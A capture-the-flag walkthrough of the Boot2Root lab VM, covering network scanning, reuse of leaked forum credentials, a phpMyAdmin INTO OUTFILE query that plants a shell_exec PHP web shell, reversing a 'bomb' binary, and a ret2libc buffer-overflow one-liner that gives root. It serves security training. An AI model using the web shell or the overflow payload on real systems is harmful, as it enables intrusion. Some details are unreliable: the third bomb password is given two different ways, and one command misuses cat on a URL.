# Setup
## Mac ARM
We will need UTM for this demo.

### UTM setup
You need to **emulate** the machine since the ISO is x86_64 based and not ARM.
Then, once you properly configured the boot settings, select your VM on the left panel and click the "Settings" (the right-est icon on the top bar of UTM)(make sure your VM is not running, else you can't edit the settings)
Under the Network tab, set Network Mode to "Host Only", and in the emulated network card pick "Intel Gigabit Ethernet (e1000)". Save and boot the VM.
Wait for the VM to fully boot, you should be prompted with the login prompt.

### Finding the IP
After the VM booted, run `ifconfig`.
```
➜  Boot2Root git:(master) ✗ ifconfig
...
bridge100: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=3<RXCSUM,TXCSUM>
	ether xxxxxx
	inet 192.168.128.1 netmask 0xffffff00 broadcast 192.168.128.255 <--- THAT LINE
	inet6 xxxxxxxx prefixlen 64 scopeid 0x1c
	Configuration:
		id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
		maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
		root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
		ipfilter disabled flags 0x0
	member: vmenet0 flags=3<LEARNING,DISCOVER>
	        ifmaxaddr 0 port 27 priority 0 path cost 0
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
```
Search for the subnetwork `bridge100` and look for the `inet` value. We will take IP `192.168.128.1` for the demo.
Then, run [`nmap`](https://nmap.org/) on the network address (the address of the subnetwork that finishes with a 0), here: `192.168.128.0`.
Then run `nmap -sn 192.168.56.0/24` (skip ping scan, only do host discovery, network mask value indicated in the `inet` field).
```
➜  Boot2Root git:(master) ✗ nmap -sn 192.168.128.0/24
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-09 10:52 +0200
Nmap scan report for 192.168.128.1
Host is up (0.00064s latency).
Nmap scan report for 192.168.128.2
Host is up (0.0026s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 125.06 seconds
```
You'll get an online host, we'll take IP `192.168.128.2` for the demo. 

To make sure that you found the right IP, navigate to `http://192.168.128.2`, you should see the website of the B2R CTF.

## Mac Intel
### VM Configuration
Configure the VM normally. 
Before booting, go to Your VM > Network > Adapter 1
Choose Bridged Adapter, pick the interface your connected to (`en0: Wifi` if in WiFi or `eth0` if ethernet)
Boot the VM

### Finding the VM
Since the VM itself doesn't give its IP away, we need to find it. First, run `ifconfig` to get the status of your network interfaces:
```
ifconfig
...
en0: flags=8b63<UP,BROADCAST,SMART,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
	options=6460<TSO4,TSO6,CHANNEL_IO,PARTIAL_CSUM,ZEROINVERT_CSUM>
	ether 1a:f5:ba:5b:f8:a5
	inet6 fe80::453:fbe2:e8af:590c%en0 prefixlen 64 secured scopeid 0x7
	inet 10.80.248.234 netmask 0xffff0000 broadcast 10.80.255.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
...
```
Which gives away IP `10.80.248.234`. Then, we launch [[Nmap]] to discover all host under that IP mask
```
➜  ~ nmap -sn 10.80.248.234/24
Starting Nmap 7.94 ( https://nmap.org ) at 2025-06-28 15:32 CEST
Nmap scan report for 10.80.248.231
Host is up (0.0012s latency).
Nmap scan report for 10.80.248.234
Host is up (0.00050s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 67.33 seconds
```
We test on the different IPs to see if they have open ports:
```
➜  ~ sudo nmap -sS -sV -O 10.80.248.231

Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2025-06-28 15:33 CEST
Nmap scan report for 10.80.248.231
Host is up (0.00071s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:B0:81:09 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds
```
This one has, we found the VM

### Accessing the VM in SSH
We start [[Nmap]] in attack mode to have a better understanding:
```
➜  ~ sudo nmap -A 10.80.248.231

Starting Nmap 7.94 ( https://nmap.org ) at 2025-06-28 15:34 CEST
Nmap scan report for 10.80.248.231
Host is up (0.00093s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2025-06-28T13:34:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: LITERAL+ capabilities more LOGINDISABLEDA0001 Pre-login IDLE ID STARTTLS have SASL-IR LOGIN-REFERRALS post-login ENABLE listed IMAP4rev1 OK
443/tcp open  ssl/http Apache httpd 2.2.22
|_ssl-date: 2025-06-28T13:34:39+00:00; 0s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-title: 404 Not Found
993/tcp open  ssl/imap Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: LITERAL+ capabilities more AUTH=PLAINA0001 IDLE IMAP4rev1 have post-login SASL-IR LOGIN-REFERRALS ENABLE Pre-login listed ID OK
|_ssl-date: 2025-06-28T13:34:39+00:00; 0s from scanner time.
MAC Address: 08:00:27:B0:81:09 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.93 ms 10.80.248.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

#### Nmap Analysis
There are multiple services running:
- FTP server: port 21
- SSH server: port 22
- HTTP/S server: port 80/443
- IMAP server: port 143
- SSL/IMAP server: port 993

#### Website analysis
The website seems somewhat empty. Using [[Gobuster]] with [SecLists](https://github.com/danielmiessler/SecLists)' Common Directory, we get:
```
➜  wordlists gobuster dir -u http://10.80.248.231 -w SecLists/Discovery/Web-Content/common.txt -t 50

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.248.231
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 290]
/.hta                 (Status: 403) [Size: 285]
/cgi-bin/             (Status: 403) [Size: 289]
/.htpasswd            (Status: 403) [Size: 290]
/fonts                (Status: 301) [Size: 314] [--> http://10.80.248.231/fonts/]
/forum                (Status: 403) [Size: 286]
/index.html           (Status: 200) [Size: 1025]
/server-status        (Status: 403) [Size: 294]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

## Ubuntu
### VirtualBox setup
You will need to create Network Manager (Host-Only Adapter).
On VirtualBox homepage, do File > Tools > Network Manager (Ctrl + H for short), then click Create.
Then, setup the VM with the B2R ISO, and go to the Settings of the VM. Click Network > Adapter 1, set "Attached to" to "Host-only Adapter". Make sure that name is the name of the virtual network you created previsouly (likely `vboxnet0`).

### Finding the IP
After the VM booted, run `ifconfig`.
Search out for the subnetwork you created in the previous step, and look for the `inet` value. We will take IP `192.168.56.1` for the demo.
Then, run [`nmap`](https://nmap.org/) on the network address (the address of the subnetwork that finishes with a 0), here: `192.168.56.0`.
Then run `nmap -sn 192.168.56.0/24` (skip ping scan, only do host discovery, network mask value indicated in the `inet` field).
You'll get an online host, we'll take IP `192.168.56.101` for the demo. 

To make sure that you found the right IP, navigate to `http://192.168.56.101`, you should see the website of the B2R CTF.

# Discovery
If you don't have root permission on the host machine, setup a [Kali Linux](https://www.kali.org/) [Docker](https://www.docker.com/):

```bash
docker pull kalilinux/kali-rolling
```

You can install dependencies or packages using [`apt`](https://doc.ubuntu-fr.org/apt):
```bash
apt update
apt install -y nmap gobuster
```

First, run `nmap` in attack mode (we will not care about stealth for the whole CTF):
```
➜  Boot2Root git:(master) ✗ nmap -A 192.168.128.2
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-09 19:04 +0200
Nmap scan report for 192.168.128.2
Host is up (1.0s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: more have listed STARTTLS IDLE SASL-IR post-login capabilities Pre-login OK ID LOGIN-REFERRALS LOGINDISABLEDA0001 LITERAL+ IMAP4rev1 ENABLE
|_ssl-date: 2025-08-09T17:08:03+00:00; -1s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_ssl-date: 2025-08-09T17:08:03+00:00; -1s from scanner time.
|_http-title: 404 Not Found
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
993/tcp open  ssl/imaps?
|_ssl-date: 2025-08-09T17:08:03+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.38 seconds
```

We idenfity 6 open ports:
- 21: `ftp`
- 22: `ssh`
- 80/443: `http`/`https`
- 143: `imap`
- 993: `ssl/imaps?`


## Web server
The website shows a page with no apparent link to any page. Thus we need to bruteforce and try to find some available pages if they exist.

We are going to use [gobuster](https://github.com/OJ/gobuster) with wordlists from [SecListsi](https://github.com/danielmiessler/SecLists):

Make sure to run on `https` not `http`:
```
➜  Web-Content git:(master) gobuster dir -u https://192.168.128.2 -w common.txt -t 50 -k -x php,html,txt -b 404 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.128.2
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 290]
/cgi-bin/.html        (Status: 403) [Size: 295]
/forum                (Status: 301) [Size: 316] [--> https://192.168.128.2/forum/]
/phpmyadmin           (Status: 301) [Size: 321] [--> https://192.168.128.2/phpmyadmin/]
/server-status        (Status: 403) [Size: 295]
/webmail              (Status: 301) [Size: 318] [--> https://192.168.128.2/webmail/]

===============================================================
Finished
===============================================================
```
- `index.html` is the default page
- `forum` is forbidden if you don't access it with HTTPS (so navigate to it in your browser at `https://192.168.128.2/forum/`)
- `fonts` is a link
- `server-status` is forbidden even in HTTPS

When exploring the forum, we see a post "Probleme login?"

Explore the logs, you should find:
```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
A user `lmezard` mistyped his password `!q\]Ej?*5K5cy*AJ` as a username. Now, enter these credentials in the login page of the forum. 

Once you're connected, navigate to the user's page and retrieve its email: `laurie@borntosec.net `. 

You can then log into the webmail (`/webmail`), and access the email `DB Access`, where you'll be greated with a root access to the DB: `root` and password `Fg-'kKXBj87E:aJ$`

Then, connect to the `/phpmyadmin` with these credentials.

With SELECT, we can create a new PHP page that would take an input as argument and show us the result, effectively creating a RCE exploit:
```SQL
SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"
```

creates PHP page:
```php
<?php
if (isset($_GET['command'])) {
    echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
}
?>
```

Searching through the file system we find /home/LOOKATME/password
```bash
cat https://192.168.56.105/forum/templates_c/test3.php?command=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

These are credentials to connect to the FTP server (try the different services and see which one works).

It contains different files. One is a README containing:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
Another one is a TAR archive `fun`, that you can un-TAR with `tar -xpf` to get a `ft_fun` folder.
It contains 750 files. Each file contains a line of a C code that needs to be put in the right order to create a program. We use a Python script (`script/decode_tarball.py`) to do that. After removing all the useless comment, we get the program, compile it and run it to get:
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

So, do as expected:
```bash
echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

So we connect with user 'laurie' in ssh.

laurie's home contains a README and a `bomb` executable. 

`bomb` requires 6 different passwords or explodes and returns, when the README is an hint to defuse the bomb:
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
Let's reverse the binary to get the password more easily. 
1. First password
The first one is easy and just strcmp on `Public speaking is very easy.` so we just enter it.

2. Second password
The second password is a math check that multiplies things in weird way in a loop, answer is easy to understand: `1 2 6 24 120 720`

3. Third password
Third one gets an int, a char and another int at the end then enters a switch statement.
By looking at the code, we see that the right combination is: `0 q 777`


4. Fourth password
Fourth one gets an int, passes it through a Fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the Fibonacci sequence, it being `9`.

5. Fifth password
Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a Python script (`script/phase_5.py`): `opekmq`

6. Sixth password
The sixth phase is more complex. We can figure out it is doing stuff with a 6 element linked list that is loaded in memory.
With gdb, we try to find what is the content of the linked list and we get :

0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260

0x804b260 <node2>:      0x000002d5      0x00000002      0x0804b254

0x804b254 <node3>:      0x0000012d      0x00000003      0x0804b248

0x804b248 <node4>:      0x000003e5      0x00000004      0x0804b23c

0x804b23c <node5>:      0x000000d4      0x00000005      0x0804b230

0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000

it seems like the linked list contains 3 items: data, index and next

After being converted to ints, the linked list looks like:

`253` -> `725` -> `301` -> `997` -> `212` -> `432`

The phase waits for 6 int inputs and first checks that there is no duplicates and that all numbers are between 1 and 6. The code sorts out the linked list based on the arguments you arguments you give it. Each argument represents a node to place at position n, n being the index of the argument. 
For example, if the original list of values is:
`253` -> `725` -> `301` -> `997` -> `212` -> `432`

Then, `6 5 4 3 2 1` will give:

`432` -> `212` -> `997` -> `725` -> `253`

So we need to find the right order in which to place the node elements. After investigation, we understand that the program wants to have the nodes sorted in reverse order. 

So we need to take the highest to lowest indexes:

`4 2 6 3 1 5`

Now we have:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

This gives us the password to access account `thor`. 

`thor`'s home contains a `turtle` file, that contains instructions for the `turtle` libray of Python, that draws on a Canvas. Run `scripts/turtle_script.py`, and get password `SLASH`, in `md5` that is `646da671ca01bb5d84dbb5fb2238dc8e`

We have a binary that is owned by `root` and that we can exploit easily byt overriding `eip` with `system` placing `/bin/sh` in the stack before, luckily `/bin/sh` is already in the stack in SHELL env variable

```bash
./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\x90' * 4 + '\x58\xcc\xf8\xb7')"`
```

Where `0xb7e6b060` is the address of system and `0xb7f8cc58` is the address of the env variable SHELL

And boom, you're `root`!
